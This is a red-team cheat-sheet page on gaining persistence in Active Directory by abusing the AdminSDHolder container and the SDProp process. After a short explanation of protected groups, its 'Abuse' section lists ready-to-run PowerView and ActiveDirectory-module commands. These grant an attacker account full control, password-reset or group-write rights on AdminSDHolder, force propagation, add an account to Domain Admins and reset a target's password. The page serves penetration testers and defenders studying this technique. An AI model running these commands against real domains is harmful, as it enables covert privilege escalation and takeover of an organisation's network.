---
description: Creating persistence via AdminSDHolder container.
---

# AdminSDHolder

## TL;DR

Security Descriptor Propagator \(SDPROP\) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL

## AdminSDHolder

AdminSDHolder is a container in AD that holds the Security Descriptor applied to members of protected groups. The ACL can be viewed on the AdminSDHolder object itself. Open Active Directory Users and Computers and ensure Advanced Features is selected in the View menu. Navigate to the ‘system’ container under the domain and right-click on the sub-container called AdminSDHolder and select properties. The Security tab displays the ACL that will be applied to all members of protected groups.

![](../../.gitbook/assets/image%20%283%29.png)

## SD Propagator

The SD Propagator is a process that runs on a schedule on the PDC emulator to find members of protected groups and ensure the appropriate Access Control List \(ACL\) is present. The SD Propagator runs every hour by default but can run at a different frequency by adding the value AdminSDProtectFrequency to **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters**. This can be configured anywhere between one minute and two hours. If the value is not present in this registry sub key, the default of 60 minutes is applied.

### Protected Groups

* Account Operators
* Backup Operators
* Server Operators
* Print Operators
* Replicator 
* Administrators
* Domain Admins
* Enterprise Admins
* Schema Admins
* Domain Controllers
* Read-only Domain Controllers

### Well known abuse

| Groups | Resume |
| :--- | :--- |
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within |
| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore |
| Server Operators | Run a command as system \(using the disabled Browser service\) |
| Print Operators | Copy ntds.dit backup, load device drivers |

## Abuse

* Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA

```text
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights All -Verbose
```

* Using ActiveDirectory Module and Set-ADACL

```text
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=test,DC=domain,DC=local' -Principal attacker -Verbose
```

* Interesting permissions \(ResetPassword, WriteMembers\)

```text
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights ResetPassword -Verbose
#
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights WriteMembers -Verbose
```

* Run SDProp manually

```text
Import-Module Invoke-SDPropagator.ps1
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

* Check the Domain Admins permission

```text
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=lab,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'attacker'}
```

* Abusing FullControl using PowerView\_dev

```text
Add-DomainGroupMember -Identity 'Domain Admins' -Members attackerda -Verbose
Add-ADGroupMember -Identity 'Domain Admins' -Members attackerda
```

* Abusing ResetPassword using PowerView\_dev

```text
Set-DomainUserPassword -Identity targetaccount -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
Set-ADAccountPassword -Identity targetaccount -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

